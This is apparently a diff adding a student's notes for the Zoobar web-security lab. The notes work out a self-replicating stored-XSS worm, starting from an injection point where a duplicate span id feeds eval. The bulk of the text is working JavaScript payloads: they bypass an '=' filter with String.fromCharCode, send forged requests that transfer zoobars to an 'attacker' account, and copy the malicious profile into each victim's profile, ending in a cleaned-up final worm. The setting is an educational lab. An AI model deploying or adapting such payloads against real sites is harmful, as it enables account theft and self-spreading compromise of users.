@@ -1,0 +1,299 @@
+Entry point:
+
+Born in Mexico and stealing your shaittt!
+</textarea>
+<span id="zoobars" class="alert('hello');"></span>
+<textarea style="display:none">
+
+
+Vulnerability is in:
+</p></div><span id='zoobars' class='35'/><script type="text/javascript">
+  var total = eval(document.getElementById('zoobars').className);
+  function showZoobars(zoobars) {
+    document.getElementById("profileheader").innerHTML =
+      "attacker's zoobars:" + zoobars;
+    if (zoobars < total) {
+      setTimeout("showZoobars(" + (zoobars + 1) + ")", 100);
+    }
+  }
+  if (total > 0) showZoobars(0);  // count up to total
+</script>
+
+in the eval call. Similar to the myspace worm they encode information in the class of some span and then call eval on it. We just need to create another span with the same id before so that document.getElementById('zoobars').className returns the classname of our span. 
+
+
+Now that we have an entry point to inject JS we need a road map for the attack:
+
+Roadmap:
+1. Transfer 1 zoobar to attacker
+2. Copy malicous profile to profile
+
+
+
+1. Transfer 1 zoobar to attacker.
+Notes: = sign gets filtered out so we need to use the String.fromCharCode technique.
+
+Born in Mexico and stealing your shaittt!
+</textarea>
+<span id="zoobars" class="
+
+alert('hello');
+var hostname = 'localhost';
+var zoobars = '1';
+var recipient = 'attacker';
+var transfer_query = 'zoobars' + String.fromCharCode(61) + zoobars + '&' + 'recipient' + String.fromCharCode(61) + recipient + '&' + 'submission' + String.fromCharCode(61) + 'Send'; 
+var transfer_url = 'http://' + hostname + '/transfer.php';
+     
+var transfer_handler = function () { 
+  if (this.readyState != 4) { return; } 
+  if (this.status != 200) { return; } 
+  
+  alert('Status: ' + this.status + '\nResponse: ' + this.responseText); 
+};     
+
+var transfer_request = new XMLHttpRequest(); 
+transfer_request.open('POST', transfer_url, false);
+transfer_request.setRequestHeader('Cookie', document.cookie); 
+transfer_request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); 
+transfer_request.onreadystatechange = transfer_handler; 
+transfer_request.send(transfer_query);
+
+"></span>
+<textarea style="display:none">
+
+
+successfully transfers 1 zoobar to attacker.
+
+
+2. copy malicious profile to profile.
+
+
+Born in Mexico and stealing your shaittt!
+</textarea>
+<span id="zoobars" class="
+
+alert('hello2');
+var hostname = 'localhost';
+var user = 'attacker';
+var profile_query = 'user' + String.fromCharCode(61) + user; 
+var profile_url = 'http://' + hostname + '/users.php?' + profile_query;
+     
+var profile_handler = function () { 
+  if (this.readyState != 4) { return; } 
+  if (this.status != 200) { return; } 
+  
+  alert('Status: ' + this.status + '\nResponse: ' + this.responseText); 
+};     
+
+var profile_request = new XMLHttpRequest(); 
+profile_request.open('GET', profile_url, false);
+profile_request.onreadystatechange = profile_handler; 
+profile_request.send();
+
+"></span>
+<textarea style="display:none">
+
+
+This succesfully gets the attacker profile and displays the whole HTML response. We need to parse that response and only exctract the attacker profile. Lets work on the event handler.
+
+Born in Mexico and stealing your shaittt!
+</textarea>
+<span id="zoobars" class="
+
+alert('hello2');
+var hostname = 'localhost';
+var user = 'attacker';
+var profile_query = 'user' + String.fromCharCode(61) + user; 
+var profile_url = 'http://' + hostname + '/users.php?' + profile_query;
+     
+var profile_handler = function () { 
+  if (this.readyState != 4) { return; } 
+  if (this.status != 200) { return; } 
+  
+  var el = document.createElement('div'); 
+  el.innerHTML = this.responseText;
+  alert(el.innerHTML);
+  var attacker_profile = el.getElementsByTagName('p')[1].innerHTML; 
+
+  alert(attacker_profile); 
+};     
+
+var profile_request = new XMLHttpRequest(); 
+profile_request.open('GET', profile_url, false);
+profile_request.onreadystatechange = profile_handler; 
+profile_request.send();
+
+"></span>
+<textarea style="display:none">
+
+This parsed the html response and got the attacker profile back. 
+
+
+WOOWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW!!!!!!!!!!!!!!!!!1
+
+MAJOR EDIT TO STEP 2.
+
+
+HOW COME I DID NOT SEE IT?
+
+OH RAFA, ALWAYS TRYING TO TAKE THE LONG, COMPLICATED, MOST DIFFICULT PATH
+
+STEP 2 IS A 1 LINER, NO REQUESTS MADE:
+
+Born in Mexico and stealing your shaittt!
+</textarea>
+<span id="zoobars" class="
+
+  var attacker_profile = document.getElementById('profile').innerHTML; 
+  alert(attacker_profile); 
+
+"></span>
+<textarea style="display:none">
+
+
+
+
+
+Now lets update the current user profile with that profile:
+
+
+Born in Mexico and stealing your shaittt!
+</textarea>
+<span id="zoobars" class="
+
+  var attacker_profile = document.getElementById('profile').innerHTML; 
+  var hostname = 'localhost';
+  alert(attacker_profile); 
+
+  var update_query = 'profile_update' + String.fromCharCode(61) + attacker_profile + String.fromCharCode(38) + 'profile_submit' + String.fromCharCode(61) + 'Save';
+  alert(update_query);
+  var update_url = 'http://' + hostname + '/index.php';
+
+  var update_handler = function () { 
+    if (this.readyState != 4) { return; } 
+    if (this.status != 200) { return; } 
+  
+    alert('Status: ' + this.status + '\nResponse: ' + this.responseText); 
+  };     
+
+  var update_request = new XMLHttpRequest(); 
+  update_request.open('POST', update_url, false);
+  update_request.setRequestHeader('Cookie', document.cookie); 
+  update_request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); 
+  update_request.onreadystatechange = update_handler; 
+  update_request.send(update_query);
+
+"></span>
+<textarea style="display:none">
+
+
+
+That works! We now have a self replicagting profile. Couple of limitations: it does not replicate explnentially but only linearly. i.e. in order to get infected one must visit the attackers profile. Viewing an infected profile other than attacker will not work. I suspect this has to do with the stripping of the textarea tags from those profiles (maybe more)
+
+// TODO: make it spread explnentially
+// TODO: put transfer and replication together
+// TODO: show 10 zoobars after transfer
+
+
+
+
+
+
+
+
+
+3. Time to combine...
+
+Combining 1 and 2 we get
+
+
+Born in Mexico and stealing your shaittt!
+</textarea>
+<span id="zoobars" class="
+
+  var hostname = 'localhost';
+  
+  
+  alert('hello');
+  var zoobars = '1';
+  var recipient = 'attacker';
+  var transfer_query = 'zoobars' + String.fromCharCode(61) + zoobars + String.fromCharCode(38) + 'recipient' + String.fromCharCode(61) + recipient + String.fromCharCode(38) + 'submission' + String.fromCharCode(61) + 'Send'; 
+  var transfer_url = 'http://' + hostname + '/transfer.php';
+     
+  var transfer_handler = function () { 
+    if (this.readyState != 4) { return; } 
+    if (this.status != 200) { return; } 
+  
+    alert('Status: ' + this.status + '\nResponse: ' + this.responseText); 
+  };     
+
+  var transfer_request = new XMLHttpRequest(); 
+  transfer_request.open('POST', transfer_url, false);
+  transfer_request.setRequestHeader('Cookie', document.cookie); 
+  transfer_request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); 
+  transfer_request.onreadystatechange = transfer_handler; 
+  transfer_request.send(transfer_query);
+
+
+
+
+  var attacker_profile = document.getElementById('profile').innerHTML; 
+  alert(attacker_profile); 
+
+  var update_query = 'profile_update' + String.fromCharCode(61) + attacker_profile + String.fromCharCode(38) + 'profile_submit' + String.fromCharCode(61) + 'Save';
+  alert(update_query);
+  var update_url = 'http://' + hostname + '/index.php';
+
+  var update_handler = function () { 
+    if (this.readyState != 4) { return; } 
+    if (this.status != 200) { return; } 
+  
+    alert('Status: ' + this.status + '\nResponse: ' + this.responseText); 
+  };     
+
+  var update_request = new XMLHttpRequest(); 
+  update_request.open('POST', update_url, false);
+  update_request.setRequestHeader('Cookie', document.cookie); 
+  update_request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); 
+  update_request.onreadystatechange = update_handler; 
+  update_request.send(update_query);
+
+"></span>
+<textarea style="display:none">
+
+
+Works!!! Attack D is done!!! Need to cleanup and maybe add bells and whistles.\
+
+
+
+
+
+After some code cleanup we have:
+
+
+Born in Mexico and stealing your shaittt!
+</textarea>
+<span id="zoobars" class="
+  var hostname = 'localhost';  
+
+  var zoobars = '1';
+  var recipient = 'attacker';
+  var transfer_query = 'zoobars' + String.fromCharCode(61) + zoobars + String.fromCharCode(38) + 'recipient' + String.fromCharCode(61) + recipient + String.fromCharCode(38) + 'submission' + String.fromCharCode(61) + 'Send'; 
+  var transfer_url = 'http://' + hostname + '/transfer.php';
+  var transfer_request = new XMLHttpRequest(); 
+  transfer_request.open('POST', transfer_url, false);
+  transfer_request.setRequestHeader('Cookie', document.cookie); 
+  transfer_request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); 
+  transfer_request.send(transfer_query);
+
+  var attacker_profile = document.getElementById('profile').innerHTML; 
+  var update_query = 'profile_update' + String.fromCharCode(61) + attacker_profile + String.fromCharCode(38) + 'profile_submit' + String.fromCharCode(61) + 'Save';
+  var update_url = 'http://' + hostname + '/index.php';
+  var update_request = new XMLHttpRequest(); 
+  update_request.open('POST', update_url, false);
+  update_request.setRequestHeader('Cookie', document.cookie); 
+  update_request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); 
+  update_request.send(update_query);
+"></span>
+<textarea style="display:none">
+
